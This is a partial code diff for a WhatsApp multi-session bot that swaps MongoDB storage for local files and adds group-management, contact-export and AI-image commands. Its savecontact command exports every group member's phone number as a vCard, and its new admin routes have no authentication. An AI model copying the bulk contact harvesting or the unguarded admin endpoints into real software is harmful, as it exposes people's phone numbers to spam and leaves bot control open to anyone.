+          text += `╰━━━━━━━━━━━━━━━━━━━━❍\n💀 Total: ${groupArray.length} groups`;
+          
+          await sendLoadingAnimation(socket, sender, text, logo);
+          break;
+        }
+        
+        // ==================== LEAVE GROUP ====================
+        case 'leave': {
+          if (!isGroup) {
+            await sendLoadingAnimation(socket, sender, '❌ *This command only works in groups!*', logo);
+            return;
+          }
+          
+          if (!isOwner) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!\n💀 Only bot owner can make bot leave.', logo);
+            return;
+          }
+          
+          await sendLoadingAnimation(socket, from, '👋 *Bot is leaving this group...*', logo);
+          await delay(2000);
+          await socket.groupLeave(from);
+          break;
+        }
+        
+        // ==================== LEAVE MULTIPLE GROUPS ====================
+        case 'left': {
+          if (!isOwner) {
+            await sendLoadingAnimation(socket, sender, '❌ *Permission Denied!*', logo);
+            return;
+          }
+          
+          const jids = args.join(" ").split(",").map(j => j.trim());
+          if (!jids.length) {
+            await sendLoadingAnimation(socket, sender, "❌ *Provide group JIDs!*\n📌 Usage: .left jid1,jid2,jid3", logo);
+            return;
+          }
+          
+          await sendLoadingAnimation(socket, sender, `⏳ *Leaving ${jids.length} group(s)...*`, logo);
+          
+          let success = 0, failed = 0;
+          for (const jid of jids) {
+            try {
+              await socket.groupLeave(jid);
+              success++;
+              await delay(1000);
+            } catch {
+              failed++;
+            }
+          }
+          
+          await sendLoadingAnimation(socket, sender, `✅ *Left ${success} groups*\n❌ *Failed ${failed} groups*`, logo);
+          break;
+        }
+        
+        // ==================== ONLINE MEMBERS ====================
+        case 'online': {
+          if (!isGroup) {
+            await sendLoadingAnimation(socket, sender, '❌ *This command only works in groups!*', logo);
+            return;
+          }
+          
+          await sendLoadingAnimation(socket, sender, "🔍 *Scanning for online members...*", logo);
+          
+          const groupMeta = await socket.groupMetadata(from);
+          const participants = groupMeta.participants || [];
+          
+          const onlineList = [];
+          for (const p of participants) {
+            try {
+              await socket.presenceSubscribe(p.id);
+              onlineList.push(p.id);
+            } catch {}
+          }
+          
+          if (onlineList.length === 0) {
+            await sendLoadingAnimation(socket, sender, "⚠️ *No online members detected!*", logo);
+            return;
+          }
+          
+          const text = `╭━━━❰ *🟢 ONLINE MEMBERS* ❱━━━❍
+┃
+┃ 👥 *Online:* ${onlineList.length}/${participants.length}
+┃
+${onlineList.map((o, i) => `┃ ${i+1}. @${o.split('@')[0]}`).join('\n')}
+┃
+╰━━━━━━━━━━━━━━━━━━━━❍`;
+          
+          await socket.sendMessage(from, { text: text, mentions: onlineList });
+          break;
+        }
+        
+        // ==================== SAVE CONTACTS ====================
+        case 'savecontact':
+        case 'savecontacts': {
+          const groupJid = args[0];
+          if (!groupJid || !groupJid.endsWith('@g.us')) {
+            await sendLoadingAnimation(socket, sender, "❌ *Provide a valid group JID!*\n📌 Usage: .savecontact 123456789-123@g.us", logo);
+            return;
+          }
+          
+          const groupMeta = await socket.groupMetadata(groupJid);
+          const participants = groupMeta.participants || [];
+          
+          let vcard = '';
+          participants.forEach((p, i) => {
+            const num = p.id.split('@')[0];
+            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:Group Member ${i+1}\nTEL;waid=${num}:+${num}\nEND:VCARD\n`;
+          });
+          
+          const filePath = path.join(SESSIONS_DIR, `contacts_${Date.now()}.vcf`);
+          fs.writeFileSync(filePath, vcard);
+          
+          await socket.sendMessage(sender, {
+            document: fs.readFileSync(filePath),
+            mimetype: 'text/vcard',
+            fileName: `group_contacts.vcf`,
+            caption: `✅ *Contacts Exported!*\n👥 Group: ${groupMeta.subject}\n📇 Total: ${participants.length}\n💀 ${BOT_NAME_FANCY}`
+          });
+          
+          fs.unlinkSync(filePath);
+          break;
+        }
+        
+        // ==================== NEWS LIST ====================
+        case 'newslist': {
+          const newsletters = await listNewslettersFromFile();
+          if (!newsletters.length) {
+            await sendLoadingAnimation(socket, sender, "📭 *No newsletter channels followed!*", logo);
+            return;
+          }
+          
+          let text = `╭━━━❰ *📰 FOLLOWED CHANNELS* ❱━━━❍\n┃\n`;
+          newsletters.forEach((n, i) => {
+            text += `┃ ${i+1}. 📡 ${n.jid}\n┃    💀 Reactions: ${n.emojis.length ? n.emojis.join(' ') : '(default)'}\n┃\n`;
+          });
+          text += `╰━━━━━━━━━━━━━━━━━━━━❍`;
+          
+          await sendLoadingAnimation(socket, sender, text, logo);
+          break;
+        }
+        
+        // ==================== AI IMAGE ====================
+        case 'aiimg':
+        case 'aiimage': {
+          const prompt = args.join(" ").trim();
+          if (!prompt) {
+            await sendLoadingAnimation(socket, sender, '🎨 *Please provide a prompt for AI image!*\n📌 Usage: .aiimg a cat sitting on a throne', logo);
+            return;
+          }
+          
+          await socket.sendMessage(sender, { react: { text: '🎨', key: msg.key } });
+          
+          const apiUrl = `https://api.siputzx.my.id/api/ai/flux?prompt=${encodeURIComponent(prompt)}`;
+          const response = await axios.get(apiUrl, { responseType: 'arraybuffer' });
+          
+          if (!response || !response.data) {
+            await sendLoadingAnimation(socket, sender, '❌ *Failed to generate image!*', logo);
+            return;
+          }
+          
+          const imageBuffer = Buffer.from(response.data, 'binary');
+          await sendLoadingAnimation(socket, sender, `🎨 *AI Generated Image*\n📌 Prompt: ${prompt}\n💀 ${BOT_NAME_FANCY}`, imageBuffer);
+          break;
+        }
+        
+        // ==================== DEFAULT ====================
         default:
-          // Unknown command - ignore
           break;
       }
     } catch (err) {
-      console.error('Command handler error:', err);
-      try { await socket.sendMessage(sender, { text: '❌ An error occurred while processing your command. Please try again.' }); } catch (e) { }
+      console.error('Command error:', err);
+      try { 
+        const sanitized = (number || '').replace(/[^0-9]/g, '');
+        const cfg = await loadUserConfigFromFile(sanitized) || {};
+        const logo = cfg.logo || config.RCD_IMAGE_PATH;
+        await sendLoadingAnimation(socket, sender, `❌ *Error:* ${err.message}`, logo);
+      } catch(e) {}
     }
   });
 }
 
-// ---------------- EmpirePair Function ----------------
+// ==================== Message Handlers ====================
+
+function setupMessageHandlers(socket) {
+  socket.ev.on('messages.upsert', async ({ messages }) => {
+    const msg = messages[0];
+    if (!msg.message || msg.key.remoteJid === 'status@broadcast') return;
+    if (config.AUTO_RECORDING === 'true') {
+      try { await socket.sendPresenceUpdate('recording', msg.key.remoteJid); } catch (e) {}
+    }
+  });
+}
+
+// ==================== Pairing Function ====================
 
 async function EmpirePair(number, res) {
   const sanitizedNumber = number.replace(/[^0-9]/g, '');
-  const sessionPath = path.join(os.tmpdir(), `session_${sanitizedNumber} `);
-  await initMongo().catch(() => { });
-
+  const sessionPath = path.join(SESSIONS_DIR, `session_${sanitizedNumber}`);
+  
   try {
-    const mongoDoc = await loadCredsFromMongo(sanitizedNumber);
-    if (mongoDoc && mongoDoc.creds) {
+    const fileData = await loadCredsFromFile(sanitizedNumber);
+    if (fileData && fileData.creds) {
       fs.ensureDirSync(sessionPath);
-      fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(mongoDoc.creds, null, 2));
-      if (mongoDoc.keys) fs.writeFileSync(path.join(sessionPath, 'keys.json'), JSON.stringify(mongoDoc.keys, null, 2));
-      console.log('Prefilled creds from Mongo');
+      fs.writeFileSync(path.join(sessionPath, 'creds.json'), JSON.stringify(fileData.creds, null, 2));
+      if (fileData.keys) fs.writeFileSync(path.join(sessionPath, 'keys.json'), JSON.stringify(fileData.keys, null, 2));
     }
-  } catch (e) { console.warn('Prefill from Mongo failed', e); }
+  } catch (e) {}
 
   const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
+  const logger = pino({ level: process.env.NODE_ENV === 'production' ? 'fatal' : 'debug' });
 
   try {
     const socket = makeWASocket({
-      logger: pino({ level: "silent" }),
+      auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, logger) },
       printQRInTerminal: false,
-      auth: state,
-      version: [2, 3000, 1033105955],
-      connectTimeoutMs: 60000,
-      defaultQueryTimeoutMs: 0,
-      keepAliveIntervalMs: 10000,
-      emitOwnEvents: true,
-      fireInitQueries: true,
-      generateHighQualityLinkPreview: true,
-      syncFullHistory: true,
-      markOnlineOnConnect: true,
-      browser: ['Mac OS', 'Safari', '10.15.7']
+      logger,
+      browser: ["Ubuntu","Chrome","20.0.04"],
     });
 
     socketCreationTime.set(sanitizedNumber, Date.now());
 
-    setupStatusHandlers(socket, sanitizedNumber);
+    setupStatusHandlers(socket);
     setupCommandHandlers(socket, sanitizedNumber);
-    setupMessageHandlers(socket, sanitizedNumber);
+    setupMessageHandlers(socket);
     setupAutoRestart(socket, sanitizedNumber);
     setupNewsletterHandlers(socket, sanitizedNumber);
-    handleMessageRevocation(socket, sanitizedNumber);
-    setupAutoMessageRead(socket, sanitizedNumber);
-    setupCallRejection(socket, sanitizedNumber);
 
     if (!socket.authState.creds.registered) {
       let retries = config.MAX_RETRIES;
       let code;
       while (retries > 0) {
         try { await delay(1500); code = await socket.requestPairingCode(sanitizedNumber); break; }
-        catch (error) { retries--; await delay(2000 * (config.MAX_RETRIES - retries)); }
+        catch (error) { retries--; await delay(2000); }
       }
       if (!res.headersSent) res.send({ code });
     }
@@ -1214,22 +1594,11 @@ async function EmpirePair(number, res) {
     socket.ev.on('creds.update', async () => {
       try {
         await saveCreds();
-        const credsPath = path.join(sessionPath, 'creds.json');
-        if (!fs.existsSync(credsPath)) return;
-        const fileStats = fs.statSync(credsPath);
-        if (fileStats.size === 0) return;
-        const fileContent = await fs.readFile(credsPath, 'utf8');
-        const trimmedContent = fileContent.trim();
-        if (!trimmedContent || trimmedContent === '{}' || trimmedContent === 'null') return;
-        let credsObj;
-        try { credsObj = JSON.parse(trimmedContent); } catch (e) { return; }
-        if (!credsObj || typeof credsObj !== 'object') return;
+        const fileContent = await fs.readFile(path.join(sessionPath, 'creds.json'), 'utf8');
+        const credsObj = JSON.parse(fileContent);
         const keysObj = state.keys || null;
-        await saveCredsToMongo(sanitizedNumber, credsObj, keysObj);
-        console.log('✅ Creds saved to MongoDB successfully');
-      } catch (err) {
-        console.error('Failed saving creds on creds.update:', err);
-      }
+        await saveCredsToFile(sanitizedNumber, credsObj, keysObj);
+      } catch (err) {}
     });
 
     socket.ev.on('connection.update', async (update) => {
@@ -1238,81 +1607,22 @@ async function EmpirePair(number, res) {
         try {
           await delay(3000);
           const userJid = jidNormalizedUser(socket.user.id);
-          const groupResult = await joinGroup(socket).catch(() => ({ status: 'failed', error: 'joinGroup not configured' }));
-
-          try {
-            const newsletterListDocs = await listNewslettersFromMongo();
-            for (const doc of newsletterListDocs) {
-              const jid = doc.jid;
-              try { if (typeof socket.newsletterFollow === 'function') await socket.newsletterFollow(jid); } catch (e) { }
-            }
-          } catch (e) { }
-
+          
           activeSockets.set(sanitizedNumber, socket);
-          const groupStatus = groupResult.status === 'success' ? 'Joined successfully' : `Failed to join group: ${groupResult.error} `;
-          const userConfig = await loadUserConfigFromMongo(sanitizedNumber) || {};
+          
+          const userConfig = await loadUserConfigFromFile(sanitizedNumber) || {};
           const useBotName = userConfig.botName || BOT_NAME_FANCY;
-          const useLogo = config.RCD_IMAGE_PATH;
-
+          const useLogo = userConfig.logo || config.RCD_IMAGE_PATH;
+          
           const initialCaption = formatMessage(useBotName,
-            `*✅ 𝗦ᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ 𝗖ᴏɴɴᴇᴄᴛᴇᴅ ✅*\n\n*🔢 𝗡ᴜᴍʙᴇʀ:* ${sanitizedNumber}\n*📡 𝗖ᴏɴɴᴇᴄᴛɪɴɢ:* Wait few seconds`,
+            `✅ *Successfully Connected!*\n\n📞 *Number:* ${sanitizedNumber}\n🕐 *Time:* ${getSriLankaTimestamp()}\n💀 *Hacker Bot Active*`,
             useBotName
           );
-
-          let sentMsg = null;
-          try {
-            if (String(useLogo).startsWith('http')) {
-              sentMsg = await socket.sendMessage(userJid, { image: { url: useLogo }, caption: initialCaption });
-            } else {
-              try {
-                const buf = fs.readFileSync(useLogo);
-                sentMsg = await socket.sendMessage(userJid, { image: buf, caption: initialCaption });
-              } catch (e) {
-                sentMsg = await socket.sendMessage(userJid, { image: { url: config.RCD_IMAGE_PATH }, caption: initialCaption });
-              }
-            }
-          } catch (e) {
-            try { sentMsg = await socket.sendMessage(userJid, { text: initialCaption }); } catch (e) { }
-          }
-
-          await delay(4000);
-
-          const updatedCaption = formatMessage(useBotName,
-            `*✅ 𝗦ᴜᴄᴄᴇꜱꜱꜰᴜʟʟʏ 𝗖ᴏɴɴᴇᴄᴛᴇᴅ ✅*\n\n*🔢 𝗡ᴜᴍʙᴇʀ:* ${sanitizedNumber}\n*🏷️ 𝗦ᴛᴀᴛᴜꜱ:* ${groupStatus}\n*🕒 𝗖ᴏɴɴᴇᴄᴛ 𝗧ɪᴍᴇ:* ${getSriLankaTimestamp()}`,
-            useBotName
-          );
-
-          try {
-            if (sentMsg && sentMsg.key) {
-              try { await socket.sendMessage(userJid, { delete: sentMsg.key }); } catch (delErr) { }
-            }
-            try {
-              if (String(useLogo).startsWith('http')) {
-                await socket.sendMessage(userJid, { image: { url: useLogo }, caption: updatedCaption });
-              } else {
-                try {
-                  const buf = fs.readFileSync(useLogo);
-                  await socket.sendMessage(userJid, { image: buf, caption: updatedCaption });
-                } catch (e) {
-                  await socket.sendMessage(userJid, { text: updatedCaption });
-                }
-              }
-            } catch (imgErr) {
-              await socket.sendMessage(userJid, { text: updatedCaption });
-            }
-          } catch (e) { }
-
-          await sendAdminConnectMessage(socket, sanitizedNumber, groupResult, userConfig);
-          await sendOwnerConnectMessage(socket, sanitizedNumber, groupResult, userConfig);
-          await addNumberToMongo(sanitizedNumber);
-
-        } catch (e) {
-          console.error('Connection open error:', e);
-          try { exec(`pm2.restart ${process.env.PM2_NAME || 'CHATUWA-MINI-main'} `); } catch (e) { }
-        }
-      }
-      if (connection === 'close') {
-        try { if (fs.existsSync(sessionPath)) fs.removeSync(sessionPath); } catch (e) { }
+          
+          await sendLoadingAnimation(socket, userJid, initialCaption, useLogo);
+          await addNumberToFile(sanitizedNumber);
+          
+        } catch (e) { console.error('Connection open error:', e); }
       }
     });
 
@@ -1325,177 +1635,68 @@ async function EmpirePair(number, res) {
   }
 }
 
-// ---------------- Express Routes ----------------
-
-router.post('/newsletter/add', async (req, res) => {
-  const { jid, emojis } = req.body;
-  if (!jid) return res.status(400).send({ error: 'jid required' });
-  if (!jid.endsWith('@newsletter')) return res.status(400).send({ error: 'Invalid newsletter jid' });
-  try {
-    await addNewsletterToMongo(jid, Array.isArray(emojis) ? emojis : []);
-    res.status(200).send({ status: 'ok', jid });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
-
-router.post('/newsletter/remove', async (req, res) => {
-  const { jid } = req.body;
-  if (!jid) return res.status(400).send({ error: 'jid required' });
-  try {
-    await removeNewsletterFromMongo(jid);
-    res.status(200).send({ status: 'ok', jid });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
-
-router.get('/newsletter/list', async (req, res) => {
-  try {
-    const list = await listNewslettersFromMongo();
-    res.status(200).send({ status: 'ok', channels: list });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
-
-router.post('/admin/add', async (req, res) => {
-  const { jid } = req.body;
-  if (!jid) return res.status(400).send({ error: 'jid required' });
-  try {
-    await addAdminToMongo(jid);
-    res.status(200).send({ status: 'ok', jid });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
-
-router.post('/admin/remove', async (req, res) => {
-  const { jid } = req.body;
-  if (!jid) return res.status(400).send({ error: 'jid required' });
-  try {
-    await removeAdminFromMongo(jid);
-    res.status(200).send({ status: 'ok', jid });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
-
-router.get('/admin/list', async (req, res) => {
-  try {
-    const list = await loadAdminsFromMongo();
-    res.status(200).send({ status: 'ok', admins: list });
-  } catch (e) { res.status(500).send({ error: e.message || e }); }
-});
+// ==================== Express Routes ====================
 
 router.get('/', async (req, res) => {
   const { number } = req.query;
   if (!number) return res.status(400).send({ error: 'Number parameter is required' });
-  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
+  if (activeSockets.has(number.replace(/[^0-9]/g, ''))) {
+    return res.status(200).send({ status: 'already_connected', message: 'This number is already connected' });
+  }
   await EmpirePair(number, res);
 });
 
 router.get('/active', (req, res) => {
-  res.status(200).send({ botName: BOT_NAME_FANCY, count: activeSockets.size, numbers: Array.from(activeSockets.keys()), timestamp: getSriLankaTimestamp() });
+  res.status(200).send({ 
+    botName: BOT_NAME_FANCY, 
+    count: activeSockets.size, 
+    numbers: Array.from(activeSockets.keys()), 
+    timestamp: getSriLankaTimestamp() 
+  });
 });
 
 router.get('/ping', (req, res) => {
-  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, message: 'xCDT INVICTUS MINI BOT', activesession: activeSockets.size });
+  res.status(200).send({ status: 'active', botName: BOT_NAME_FANCY, activesession: activeSockets.size });
 });
 
 router.get('/connect-all', async (req, res) => {
   try {
-    const numbers = await getAllNumbersFromMongo();
-    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found to connect' });
+    const numbers = await getAllNumbersFromFile();
+    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No numbers found' });
     const results = [];
     for (const number of numbers) {
-      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
-      const mockRes = { headersSent: false, send: () => { }, status: () => mockRes };
+      if (activeSockets.has(number)) { 
+        results.push({ number, status: 'already_connected' }); 
+        continue; 
+      }
+      const mockRes = { headersSent: false, send: () => {}, status: () => mockRes };
       await EmpirePair(number, mockRes);
       results.push({ number, status: 'connection_initiated' });
-    }
-    res.status(200).send({ status: 'success', connections: results });
-  } catch (error) { console.error('Connect all error:', error); res.status(500).send({ error: 'Failed to connect all bots' }); }
-});
-
-router.get('/reconnect', async (req, res) => {
-  try {
-    const numbers = await getAllNumbersFromMongo();
-    if (!numbers || numbers.length === 0) return res.status(404).send({ error: 'No session numbers found in MongoDB' });
-    const results = [];
-    for (const number of numbers) {
-      if (activeSockets.has(number)) { results.push({ number, status: 'already_connected' }); continue; }
-      const mockRes = { headersSent: false, send: () => { }, status: () => mockRes };
-      try { await EmpirePair(number, mockRes); results.push({ number, status: 'connection_initiated' }); } catch (err) { results.push({ number, status: 'failed', error: err.message }); }
       await delay(1000);
     }
     res.status(200).send({ status: 'success', connections: results });
-  } catch (error) { console.error('Reconnect error:', error); res.status(500).send({ error: 'Failed to reconnect bots' }); }
-});
-
-router.get('/update-config', async (req, res) => {
-  const { number, config: configString } = req.query;
-  if (!number || !configString) return res.status(400).send({ error: 'Number and config are required' });
-  let newConfig;
-  try { newConfig = JSON.parse(configString); } catch (error) { return res.status(400).send({ error: 'Invalid config format' }); }
-  const sanitizedNumber = number.replace(/[^0-9]/g, '');
-  const socket = activeSockets.get(sanitizedNumber);
-  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
-  const otp = generateOTP();
-  otpStore.set(sanitizedNumber, { otp, expiry: Date.now() + config.OTP_EXPIRY, newConfig });
-  try { await sendOTP(socket, sanitizedNumber, otp); res.status(200).send({ status: 'otp_sent', message: 'OTP sent to your number' }); }
-  catch (error) { otpStore.delete(sanitizedNumber); res.status(500).send({ error: 'Failed to send OTP' }); }
-});
-
-router.get('/verify-otp', async (req, res) => {
-  const { number, otp } = req.query;
-  if (!number || !otp) return res.status(400).send({ error: 'Number and OTP are required' });
-  const sanitizedNumber = number.replace(/[^0-9]/g, '');
-  const storedData = otpStore.get(sanitizedNumber);
-  if (!storedData) return res.status(400).send({ error: 'No OTP request found for this number' });
-  if (Date.now() >= storedData.expiry) { otpStore.delete(sanitizedNumber); return res.status(400).send({ error: 'OTP has expired' }); }
-  if (storedData.otp !== otp) return res.status(400).send({ error: 'Invalid OTP' });
-  try {
-    await setUserConfigInMongo(sanitizedNumber, storedData.newConfig);
-    otpStore.delete(sanitizedNumber);
-    const sock = activeSockets.get(sanitizedNumber);
-    if (sock) await sock.sendMessage(jidNormalizedUser(sock.user.id), { image: { url: config.RCD_IMAGE_PATH }, caption: formatMessage('📌 CONFIG UPDATED', 'Your configuration has been successfully updated!', BOT_NAME_FANCY) });
-    res.status(200).send({ status: 'success', message: 'Config updated successfully' });
-  } catch (error) { console.error('Failed to update config:', error); res.status(500).send({ error: 'Failed to update config' }); }
-});
-
-router.get('/getabout', async (req, res) => {
-  const { number, target } = req.query;
-  if (!number || !target) return res.status(400).send({ error: 'Number and target number are required' });
-  const sanitizedNumber = number.replace(/[^0-9]/g, '');
-  const socket = activeSockets.get(sanitizedNumber);
-  if (!socket) return res.status(404).send({ error: 'No active session found for this number' });
-  const targetJid = `${target.replace(/[^0-9]/g, '')}@s.whatsapp.net`;
-  try {
-    const statusData = await socket.fetchStatus(targetJid);
-    const aboutStatus = statusData.status || 'No status available';
-    const setAt = statusData.setAt ? moment(statusData.setAt).tz('Asia/Colombo').format('YYYY-MM-DD HH:mm:ss') : 'Unknown';
-    res.status(200).send({ status: 'success', number: target, about: aboutStatus, setAt: setAt });
-  } catch (error) { console.error(`Failed to fetch status for ${target}: `, error); res.status(500).send({ status: 'error', message: `Failed to fetch About status for ${target}.` }); }
-});
-
-// ---------------- Dashboard endpoints ----------------
-
-const dashboardStaticDir = path.join(__dirname, 'dashboard_static');
-if (!fs.existsSync(dashboardStaticDir)) fs.ensureDirSync(dashboardStaticDir);
-router.use('/dashboard/static', express.static(dashboardStaticDir));
-router.get('/dashboard', async (req, res) => {
-  res.sendFile(path.join(dashboardStaticDir, 'index.html'));
+  } catch (error) { 
+    res.status(500).send({ error: 'Failed to connect all bots' }); 
+  }
 });
 
 router.get('/api/sessions', async (req, res) => {
   try {
-    await initMongo();
-    const docs = await sessionsCol.find({}, { projection: { number: 1, updatedAt: 1 } }).sort({ updatedAt: -1 }).toArray();
-    res.json({ ok: true, sessions: docs });
+    const sessionsDir = SESSIONS_DIR;
+    const files = fs.readdirSync(sessionsDir).filter(f => f.startsWith('session_') && f.endsWith('.json'));
+    const sessions = [];
+    for (const file of files) {
+      const data = JSON.parse(fs.readFileSync(path.join(sessionsDir, file), 'utf8'));
+      sessions.push({ number: data.number, updatedAt: data.updatedAt });
+    }
+    res.json({ ok: true, sessions: sessions.sort((a,b) => new Date(b.updatedAt) - new Date(a.updatedAt)) });
   } catch (err) {
-    console.error('API /api/sessions error', err);
-    res.status(500).json({ ok: false, error: err.message || err });
+    res.status(500).json({ ok: false, error: err.message });
   }
 });
 
 router.get('/api/active', async (req, res) => {
-  try {
-    const keys = Array.from(activeSockets.keys());
-    res.json({ ok: true, active: keys, count: keys.length });
-  } catch (err) {
-    res.status(500).json({ ok: false, error: err.message || err });
-  }
+  res.json({ ok: true, active: Array.from(activeSockets.keys()), count: activeSockets.size });
 });
 
 router.post('/api/session/delete', async (req, res) => {
@@ -1505,94 +1706,70 @@ router.post('/api/session/delete', async (req, res) => {
     const sanitized = ('' + number).replace(/[^0-9]/g, '');
     const running = activeSockets.get(sanitized);
     if (running) {
-      try { if (typeof running.logout === 'function') await running.logout().catch(() => { }); } catch (e) { }
-      try { running.ws?.close(); } catch (e) { }
+      try { await running.logout(); } catch(e){}
+      try { running.ws?.close(); } catch(e){}
       activeSockets.delete(sanitized);
-      socketCreationTime.delete(sanitized);
     }
-    await removeSessionFromMongo(sanitized);
-    await removeNumberFromMongo(sanitized);
-    try { const sessTmp = path.join(os.tmpdir(), `session_${sanitized} `); if (fs.existsSync(sessTmp)) fs.removeSync(sessTmp); } catch (e) { }
+    await removeSessionFromFile(sanitized);
+    await removeNumberFromFile(sanitized);
     res.json({ ok: true, message: `Session ${sanitized} removed` });
   } catch (err) {
-    console.error('API /api/session/delete error', err);
-    res.status(500).json({ ok: false, error: err.message || err });
+    res.status(500).json({ ok: false, error: err.message });
   }
 });
 
-router.get('/api/newsletters', async (req, res) => {
-  try {
-    const list = await listNewslettersFromMongo();
-    res.json({ ok: true, list });
-  } catch (err) {
-    res.status(500).json({ ok: false, error: err.message || err });
-  }
+// Admin endpoints
+router.post('/admin/add', async (req, res) => {
+  const { jid } = req.body;
+  if (!jid) return res.status(400).send({ error: 'jid required' });
+  await addAdminToFile(jid);
+  res.status(200).send({ status: 'ok', jid });
 });
 
-router.get('/api/admins', async (req, res) => {
-  try {
-    const list = await loadAdminsFromMongo();
-    res.json({ ok: true, list });
-  } catch (err) {
-    res.status(500).json({ ok: false, error: err.message || err });
-  }
+router.post('/admin/remove', async (req, res) => {
+  const { jid } = req.body;
+  if (!jid) return res.status(400).send({ error: 'jid required' });
+  await removeAdminFromFile(jid);
+  res.status(200).send({ status: 'ok', jid });
 });
 
-// ---------------- Cleanup + Process Events ----------------
+router.get('/admin/list', async (req, res) => {
+  const list = await loadAdminsFromFile();
+  res.status(200).send({ status: 'ok', admins: list });
+});
+
+router.post('/newsletter/add', async (req, res) => {
+  const { jid, emojis } = req.body;
+  if (!jid) return res.status(400).send({ error: 'jid required' });
+  await addNewsletterToFile(jid, Array.isArray(emojis) ? emojis : []);
+  res.status(200).send({ status: 'ok', jid });
+});
+
+router.post('/newsletter/remove', async (req, res) => {
+  const { jid } = req.body;
+  if (!jid) return res.status(400).send({ error: 'jid required' });
+  await removeNewsletterFromFile(jid);
+  res.status(200).send({ status: 'ok', jid });
+});
+
+router.get('/newsletter/list', async (req, res) => {
+  const list = await listNewslettersFromFile();
+  res.status(200).send({ status: 'ok', channels: list });
+});
+
+// ==================== Cleanup ====================
 
 process.on('exit', () => {
   activeSockets.forEach((socket, number) => {
-    try { socket.ws.close(); } catch (e) { }
+    try { socket.ws.close(); } catch (e) {}
     activeSockets.delete(number);
-    socketCreationTime.delete(number);
-    try { fs.removeSync(path.join(os.tmpdir(), `session_${number} `)); } catch (e) { }
   });
 });
 
 process.on('uncaughtException', (err) => {
   console.error('Uncaught exception:', err);
-  try { exec(`pm2.restart ${process.env.PM2_NAME || 'CHATUWA-MINI-main'} `); } catch (e) { console.error('Failed to restart pm2:', e); }
 });
 
-// Initialize mongo & auto-reconnect
-initMongo().then(async () => {
-  try {
-    const credsJson = process.env.CREDS_JSON || config.CREDS_JSON;
-    const sessionId = process.env.SESSION_ID || config.SESSION_ID;
-    const ownerNumber = (config.OWNER_NUMBER || '').replace(/[^0-9]/g, '');
-
-    if (ownerNumber) {
-      let creds = null;
-      if (credsJson) {
-        console.log('Found CREDS_JSON in environment variables.');
-        creds = JSON.parse(credsJson);
-      } else if (sessionId) {
-        console.log(`Found SESSION_ID(${sessionId}) in environment variables. Fetching...`);
-        const url = sessionId.startsWith('http') ? sessionId : `https://files.catbox.moe/${sessionId}`;
-        const resp = await axios.get(url);
-        creds = resp.data;
-      }
-      if (creds && typeof creds === 'object') {
-        await saveCredsToMongo(ownerNumber, creds);
-        console.log(`✅ Loaded and saved session from ENV for ${ownerNumber}`);
-      }
-    }
-  } catch (e) {
-    console.error('Error loading session from env:', e.message);
-  }
-
-  try {
-    const nums = await getAllNumbersFromMongo();
-    if (nums && nums.length) {
-      for (const n of nums) {
-        if (!activeSockets.has(n)) {
-          const mockRes = { headersSent: false, send: () => { }, status: () => mockRes };
-          await EmpirePair(n, mockRes);
-          await delay(500);
-        }
-      }
-    }
-  } catch (e) { }
-}).catch(err => console.warn('Mongo init failed at startup', err));
+initMongo();
 
 module.exports = router;
